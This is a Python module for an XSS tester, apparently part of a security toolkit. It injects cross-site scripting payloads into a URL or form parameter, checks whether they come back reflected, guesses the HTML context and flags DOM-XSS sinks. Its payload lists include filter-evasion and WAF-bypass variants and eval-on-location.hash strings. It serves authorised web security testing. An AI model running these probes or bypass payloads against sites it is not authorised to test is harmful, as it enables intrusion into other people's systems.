"""Reflected XSS helper utility."""

from __future__ import annotations

import html
import json
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Sequence, Tuple

from ..base import ToolResult

_DEFAULT_HEADERS = {
    "User-Agent": "Cryptea/XSSTester",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

PAYLOAD_SETS: Dict[str, Sequence[str]] = {
    "basic": (
        "<script>alert('xss')</script>",
        "<svg onload=alert(1)>",
        "'\"/><img src=x onerror=alert(1)>",
    ),
    "attribute": (
        '" onmouseover=alert(1) x="',
        "javascript:alert(1)",
    ),
    "html": (
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<math href=javascript:alert(1)>",
    ),
    "filter_bypass": (
        "<ScRiPt>alert('xss')</ScRiPt>",
        "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "<img src=x onerror=\"alert('xss')\">",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "'>alert('xss')</script>",
        "\"><script>alert('xss')</script>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
    ),
    "waf_bypass": (
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>setTimeout('alert(1)',0)</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>['alert'](1)</script>",
        "<script>window['alert'](1)</script>",
        "<svg/onload=alert`1`>",
        "<img src=x onerror=window['alert'](1)>",
        "<svg onload=eval(atob('YWxlcnQoMSk='))>",
        "<body onload=prompt(1)>",
        "<input type=text onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<div onmouseenter=alert(1)>test</div>",
    ),
    "dom_based": (
        "<script>eval(location.hash.slice(1))</script>",
        "<script>eval(document.location)</script>",
        "<script>eval(window.name)</script>",
        "<script>eval(document.referrer)</script>",
        "<img src=x onerror=eval(window.location.hash.substring(1))>",
    ),
    "callback": (
        "<script>jQuery.globalEval('alert(1)')</script>",
        "<script>angular.element(document.body).injector().get('$eval')('alert(1)')</script>",
        "<script>Vue.nextTick(function(){alert(1)})</script>",
        "<script>React.createElement('script',{dangerouslySetInnerHTML:{__html:'alert(1)'}})</script>",
    ),
}


@dataclass(slots=True)
class _XSSProbe:
    payload: str
    status: int
    response_size: int
    reflected: bool
    html_encoded: bool
    url_encoded: bool
    snippet: Optional[str]
    transport_error: Optional[str]


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[override]
        return None


class XSSTester:
    name = "XSS Tester"
    description = "Check for reflected payloads and generate safe previews."
    category = "Web"

    def run(
        self,
        target: str,
        parameter: str = "",
        method: str = "GET",
        body: str = "",
        payload_profile: str = "basic",
        custom_payloads: str = "",
        cookies: str = "",
        headers: str = "",
        follow_redirects: str = "true",
        timeout: str = "8",
        detect_context: str = "true",
        dom_analysis: str = "false",
    ) -> ToolResult:
        target = target.strip()
        if not target:
            raise ValueError("Target URL is required")
        method = (method or "GET").upper()
        if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
            method = "GET"

        payloads = list(PAYLOAD_SETS.get(payload_profile, ()))
        payloads.extend(_split_custom_payloads(custom_payloads))
        if not payloads:
            raise ValueError("Provide at least one payload")

        follow = follow_redirects.strip().lower() in {"1", "true", "yes", "on"}
        timeout_val = max(float(timeout or 8), 1.0)

        parsed = urllib.parse.urlsplit(target)
        params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        chosen_param = parameter.strip() or (params[0][0] if params else "q")

        opener = self._build_opener(follow)
        request_headers = self._parse_headers(headers)
        final_headers = {**_DEFAULT_HEADERS, **request_headers}
        if cookies:
            final_headers["Cookie"] = cookies.strip()

        results: List[_XSSProbe] = []
        for payload in payloads:
            results.append(
                self._send_probe(
                    opener=opener,
                    method=method,
                    target=target,
                    parameter=chosen_param,
                    payload=payload,
                    body_template=body,
                    headers=final_headers,
                    timeout=timeout_val,
                )
            )

        lines = [
            f"Target: {target}",
            f"Method: {method}",
            f"Parameter: {chosen_param}",
            "",
            "Payload results:",
        ]
        
        # Context detection
        detected_context: Optional[str] = None
        if self._truthy(detect_context) and results:
            baseline_response = self._get_baseline_response(opener, target, method, chosen_param, body, final_headers, timeout_val)
            if baseline_response:
                detected_context = self._detect_html_context(baseline_response, chosen_param)
                if detected_context:
                    lines.append(f"Detected context: {detected_context}")
                    lines.append("")
        
        # DOM analysis
        if self._truthy(dom_analysis) and results:
            baseline_response = self._get_baseline_response(opener, target, method, chosen_param, body, final_headers, timeout_val)
            if baseline_response:
                dom_issues = self._analyze_dom_xss(baseline_response, chosen_param)
                if dom_issues:
                    lines.append("DOM XSS Analysis:")
                    lines.extend(dom_issues)
                    lines.append("")
        
        for probe in results:
            markers: List[str] = []
            if probe.reflected:
                markers.append("reflected raw")
            if probe.html_encoded:
                markers.append("HTML encoded")
            if probe.url_encoded:
                markers.append("URL encoded")
            if probe.transport_error:
                markers.append(f"transport:{probe.transport_error}")
            marker_str = f" ({'; '.join(markers)})" if markers else ""
            lines.append(
                f"- {probe.payload!r} -> status {probe.status}, {probe.response_size} bytes{marker_str}"
            )
            if probe.snippet:
                lines.append(f"  snippet: {probe.snippet}")

        return ToolResult(title=f"XSS tester: {target}", body="\n".join(lines))

    def _build_opener(self, follow: bool) -> urllib.request.OpenerDirector:
        handlers: List[urllib.request.BaseHandler] = []
        if not follow:
            handlers.append(_NoRedirect())
        return urllib.request.build_opener(*handlers)

    def _send_probe(
        self,
        opener: urllib.request.OpenerDirector,
        method: str,
        target: str,
        parameter: str,
        payload: str,
        body_template: str,
        headers: Dict[str, str],
        timeout: float,
    ) -> _XSSProbe:
        url, data = self._apply_payload(target, method, parameter, payload, body_template)
        request = urllib.request.Request(url=url, data=data, method=method)
        for key, value in headers.items():
            request.add_header(key, value)
        body_bytes = b""
        status = 0
        transport_error: Optional[str] = None
        try:
            with opener.open(request, timeout=timeout) as resp:
                status = getattr(resp, "status", getattr(resp, "code", 0))
                body_bytes = resp.read(65536)
        except urllib.error.HTTPError as exc:
            status = exc.code
            try:
                body_bytes = exc.read(65536)
            except Exception:
                body_bytes = b""
        except urllib.error.URLError as exc:
            transport_error = getattr(exc.reason, "strerror", str(exc.reason))
        except Exception as exc:  # pragma: no cover
            transport_error = str(exc)
        text = body_bytes.decode("utf-8", errors="replace")
        reflected = payload in text
        html_encoded = html.escape(payload) in text
        url_encoded = urllib.parse.quote(payload, safe="") in text
        snippet = None
        if reflected:
            snippet = _make_snippet(text, payload)
        elif html_encoded:
            snippet = _make_snippet(text, html.escape(payload))
        elif url_encoded:
            snippet = _make_snippet(text, urllib.parse.quote(payload, safe=""))
        return _XSSProbe(
            payload=payload,
            status=status,
            response_size=len(body_bytes),
            reflected=reflected,
            html_encoded=html_encoded,
            url_encoded=url_encoded,
            snippet=snippet,
            transport_error=transport_error,
        )

    def _apply_payload(
        self,
        target: str,
        method: str,
        parameter: str,
        payload: str,
        body_template: str,
    ) -> Tuple[str, Optional[bytes]]:
        parsed = urllib.parse.urlsplit(target)
        query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        if method == "GET":
            replaced = False
            for idx, (key, value) in enumerate(query):
                if key == parameter:
                    query[idx] = (key, payload)
                    replaced = True
                    break
            if not replaced:
                query.append((parameter, payload))
            new_query = urllib.parse.urlencode(query)
            rebuilt = parsed._replace(query=new_query)
            return urllib.parse.urlunsplit(rebuilt), None
        if body_template.strip().startswith("{"):
            try:
                parsed_body = json.loads(body_template) if body_template.strip() else {}
            except json.JSONDecodeError:
                parsed_body = {}
            parsed_body[parameter] = payload
            data = json.dumps(parsed_body).encode("utf-8")
        else:
            pairs = urllib.parse.parse_qsl(body_template, keep_blank_values=True)
            replaced = False
            for idx, (key, value) in enumerate(pairs):
                if key == parameter:
                    pairs[idx] = (key, payload)
                    replaced = True
                    break
            if not replaced:
                pairs.append((parameter, payload))
            data = urllib.parse.urlencode(pairs).encode("utf-8")
        return target, data

    def _get_baseline_response(
        self,
        opener: urllib.request.OpenerDirector,
        target: str,
        method: str,
        parameter: str,
        body_template: str,
        headers: Dict[str, str],
        timeout: float,
    ) -> Optional[str]:
        """Get baseline response without payload."""
        url, data = self._apply_payload(target, method, parameter, "BASELINE_TEST_VALUE", body_template)
        request = urllib.request.Request(url=url, data=data, method=method)
        for key, value in headers.items():
            request.add_header(key, value)
        
        try:
            with opener.open(request, timeout=timeout) as resp:
                body_bytes = resp.read(65536)
                return body_bytes.decode("utf-8", errors="replace")
        except Exception:
            return None

    def _detect_html_context(self, response: str, parameter: str) -> Optional[str]:
        """Detect HTML context where parameter is reflected."""
        test_value = "BASELINE_TEST_VALUE"
        idx = response.find(test_value)
        if idx == -1:
            return None
        
        # Check surrounding context
        before = response[max(0, idx - 100):idx].lower()
        after = response[idx + len(test_value):idx + len(test_value) + 100].lower()
        context = (before + " " + after).lower()
        
        # Detect context type
        if "<script" in before or "</script" in before:
            if "var" in before or "let" in before or "const" in before:
                return "JavaScript variable context"
            return "JavaScript context"
        elif "onerror" in before or "onload" in before or "onclick" in before:
            return "Event handler context"
        elif "<input" in before or "<textarea" in before:
            if "value=" in before:
                return "HTML attribute context (value)"
            return "HTML tag context"
        elif context.count("<") > context.count(">"):
            return "HTML tag context"
        elif '"' in before or "'" in before:
            return "HTML attribute context (quoted)"
        elif "href=" in before or "src=" in before:
            return "URL context"
        else:
            return "HTML body context"

    def _analyze_dom_xss(self, response: str, parameter: str) -> List[str]:
        """Analyze response for DOM-based XSS patterns."""
        issues: List[str] = []
        
        # Look for dangerous JavaScript patterns
        dangerous_patterns = [
            (r"eval\s*\([^)]*location", "eval() with location - potential DOM XSS"),
            (r"eval\s*\([^)]*document\.location", "eval() with document.location - potential DOM XSS"),
            (r"innerHTML\s*=\s*[^;]*location", "innerHTML assignment with location - potential DOM XSS"),
            (r"document\.write\s*\([^)]*location", "document.write() with location - potential DOM XSS"),
            (r"document\.writeln\s*\([^)]*location", "document.writeln() with location - potential DOM XSS"),
            (r"\.innerHTML\s*=.*window\.location", "innerHTML with window.location - potential DOM XSS"),
            (r"location\.hash", "location.hash usage - potential DOM XSS"),
            (r"document\.URL", "document.URL usage - potential DOM XSS"),
            (r"document\.documentURI", "document.documentURI usage - potential DOM XSS"),
            (r"window\.name", "window.name usage - potential DOM XSS"),
        ]
        
        import re
        for pattern, description in dangerous_patterns:
            if re.search(pattern, response, re.IGNORECASE):
                issues.append(f"⚠ {description}")
        
        return issues

    def _truthy(self, value: str | bool | None) -> bool:
        if isinstance(value, bool):
            return value
        if value is None:
            return False
        return str(value).strip().lower() in {"1", "true", "yes", "on"}

    def _parse_headers(self, blob: str) -> Dict[str, str]:
        headers: Dict[str, str] = {}
        for line in blob.splitlines():
            if not line.strip() or ":" not in line:
                continue
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
        return headers


def _split_custom_payloads(blob: str) -> Iterable[str]:
    for line in blob.splitlines():
        candidate = line.strip()
        if not candidate:
            continue
        yield candidate


def _make_snippet(text: str, needle: str, padding: int = 60) -> Optional[str]:
    idx = text.find(needle)
    if idx == -1:
        return None
    start = max(0, idx - padding)
    end = min(len(text), idx + len(needle) + padding)
    excerpt = text[start:end].replace("\n", " ")
    safe = html.escape(excerpt)
    safe = safe.replace(html.escape(needle), f"[[{needle}]]")
    return safe
